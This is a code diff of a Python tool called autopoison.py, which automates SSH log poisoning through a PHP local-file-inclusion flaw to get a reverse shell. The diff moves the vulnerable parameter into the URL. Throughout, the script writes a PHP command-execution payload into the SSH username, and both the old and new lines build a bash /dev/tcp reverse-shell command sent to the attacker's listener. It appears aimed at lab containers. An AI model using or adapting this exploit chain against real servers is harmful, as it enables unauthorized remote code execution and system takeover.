@@ -14,7 +14,6 @@ username = "<?php system($_GET['cmd']); ?>"
 password = 'pwned'
 
 target_url = None
-target_param = None
 target_port = None
 target_ip = None
 target_ssh_port = None
@@ -31,14 +30,12 @@ def ctrl_c(key, event):
 signal.signal(signal.SIGINT, ctrl_c)
 
 def get_args():
-    global target_port, target_ssh_port, listen_port, target_url, host_ip, target_ip, target_param
+    global target_port, target_ssh_port, listen_port, target_url, host_ip, target_ip
 
-    parser = argparse.ArgumentParser(description=colored("\u2620\ufe0f SSH Log Poisoning with LFI → Automated Reverse Shell \u2620\ufe0f\n\nej: python3 autopoison.py -u http://172.17.0.2/vuln.php -pm file -t-ip 172.17.0.1 -h-ip 172.17.0.2", 'red', attrs=["bold"]), formatter_class=StructuredFormatter)
+    parser = argparse.ArgumentParser(description=colored("\u2620\ufe0f SSH Log Poisoning with LFI → Automated Reverse Shell \u2620\ufe0f\n\nej: python3 autopoison.py -u \"http://172.17.0.2/vuln.php?file\" -t-ip 172.17.0.1 -h-ip 172.17.0.2", 'red', attrs=["bold"]), formatter_class=StructuredFormatter)
     # Required arguements:
     # Target URL
-    parser.add_argument("-u", "--target-url", required=True, dest="target_url", help="Target web url with PHP vulnerable file - ej: http://172.17.0.2/vuln.php")
-    # Parameter vuln
-    parser.add_argument("-pm", "--target-param", required=True, dest="target_param", help="Target parameter with LFI capability - ej: file")
+    parser.add_argument("-u", "--target-url", required=True, dest="target_url", help="Target web url with PHP vulnerable file - ej: http://172.17.0.2/vuln.php?file")
     # Target SSH IP
     parser.add_argument("-t-ip", "--target-ip", required=True, dest="target_ip", help="Target IP - ej: 172.17.0.2")
     # Host IP
@@ -55,7 +52,6 @@ def get_args():
     args = parser.parse_args()
 
     target_url = args.target_url
-    target_param = args.target_param
     target_port = args.target_port
     target_ip = args.target_ip
     target_ssh_port = args.target_ssh_port
@@ -81,16 +77,14 @@ def connect_ssh():
         client.close()  # Cerrar la conexión
 
 def check_read_log():
-    global target_url, target_param, logs_files, vuln_log
+    global target_url, logs_files, vuln_log
 
     normal_length = len(requests.get(target_url).content)
 
     for log_file in logs_files:
-        log_param = {
-            f'{target_param}' : f'{log_file}'
-        }
+        target_url_param = f"{target_url}={log_file}"
 
-        log_length = len(requests.get(target_url, params=log_param).content)
+        log_length = len(requests.get(target_url_param).content)
 
         if log_length != normal_length:
             vuln_log = log_file
@@ -100,18 +94,16 @@ def check_read_log():
         sys.exit(1)
 
 def reverse_shell():
-    global host_ip, listen_port, target_url, target_param, vuln_log
+    global host_ip, listen_port, target_url, vuln_log
 
-    cmd_params = {
-        f'{target_param}' : f'{vuln_log}',
-        f'cmd' : f'bash -c "bash -i >& /dev/tcp/{host_ip}/{listen_port} 0>&1"' # Modificar en payload en función de las necesidades
-    }
+    target_url = f"{target_url}={vuln_log}&cmd=bash -c 'bash -i >%26 /dev/tcp/{host_ip}/{listen_port} 0>%261'" # Modificar en payload en función de las necesidades
 
-    requests.get(target_url, params=cmd_params)
+    requests.get(target_url)
 
 def set_up_listen():
     global listen_port
 
+    print("\033[6 q")  # Código ANSI para cursor subrayado
     listener = listen(listen_port)
     conn = listener.wait_for_connection()
     conn.interactive()
